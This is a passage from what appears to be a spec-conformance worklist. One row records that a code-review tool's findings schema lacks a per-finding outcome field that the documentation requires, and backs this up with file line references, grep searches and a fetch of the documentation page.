not refuted on that axis.

column5: When Claude fixes reported findings later in the session, it reports them again, and Claude Code marks each finding in the new list as fixed, skipped, or no change needed.
column6: A re-report of previously reported findings carries, per finding, one of three outcomes so the host can mark it fixed / skipped / no change needed.
column7: `ReportFindingsSchema` accepts only `{file, summary, failureScenario, category?}` per finding. There is no outcome/state field, so a second report is indistinguishable from the first and the host cannot render fixed/skipped/no-change. `tools-reference.md` (the source our schema was derived from) never states this requirement — it is stated only here.
column8: packages/session-tools-core/src/tool-defs.ts:269-281 (FindingSchema + ReportFindingsSchema); `grep -rani "outcome|no_change_needed|'skipped'" packages/session-tools-core/src` → only unrelated task-tool hits
column9: All three checks pass, so the divergence stands. (1) QUOTE VERBATIM: curl -sL https://code.claude.com/docs/en/code-review.md (363 lines) has the sentence exactly at line 316: 'When Claude fixes reported findings later in the session, it reports them again, and Claude Code marks each finding in the new list as fixed, skipped, or no change needed.' It is a one-sentence paragraph -- no second half that reverses it. It sits two paragraphs after the ReportFindings paragraph ('When the host application requests it, Claude reports the review's findings through the ReportFindings tool ... Claude Code renders the report as a findings list'), so 'reports them again' means a second ReportFindings call. (2) CITED FILE CONFIRMED: packages/session-tools-core/src/tool-defs.ts:269-281 -- FindingSchema is exactly {file, summary, failureScenario, category?} and ReportFindingsSchema is {findings: array(1..100)}. No outcome/state field. grep -a for no_change_needed / noChangeNeeded / 'no change needed' over packages+apps (excluding dist) returns ZERO hits; the only 'outcome' hits in session-tools-core are the sibling task-tool subsystem (DocumentedTaskOutcome, tasks/documented-tasks.ts) and a local helper fn in handlers/push-notification.ts:79 -- unrelated, exactly as the finding said. So it is a model-supplied field, not host bookkeeping. (4) NOT AN OWNER DECISION: none of the nine dated decisions in 2026-07-29-inert-worklist.md section 3 touches ReportFindings (they are SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, listSessionSummaries/listSessions). ONE CORRECTION TO THE FINDING'S CONSEQUENCE: 'the host cannot render fixed/skipped/no-change' is true but mis-attributed. column5: If a skill and command share a name, the skill takes precedence
